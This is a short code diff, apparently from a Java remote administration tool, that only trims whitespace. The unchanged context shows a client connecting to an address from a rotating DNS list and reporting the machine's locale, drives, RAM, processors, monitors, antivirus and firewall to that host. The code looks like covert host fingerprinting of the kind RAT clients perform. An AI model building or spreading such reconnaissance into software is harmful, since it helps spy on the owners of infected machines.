@@ -65,7 +65,7 @@ public class Connection implements Runnable {
 	public void run() {
 		try {
 			Address address = DnsRotator.getNextAddress();
-			
+
 			socket = new Socket(address.getAddress(), address.getPort());
 
 			socket.setSoTimeout(Main.timeout);
@@ -148,16 +148,16 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
 		addToSendQueue(new Packet62InitDrives(File.listRoots()));
-		
+
 		int ram = (int) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L);
 		addToSendQueue(new Packet63InitRAM(ram));
 
 		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));
 
 		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
-		
+
 		addToSendQueue(new Packet69InitAntivirus());
-		
+
 		addToSendQueue(new Packet70InitFirewall());
 	}
 
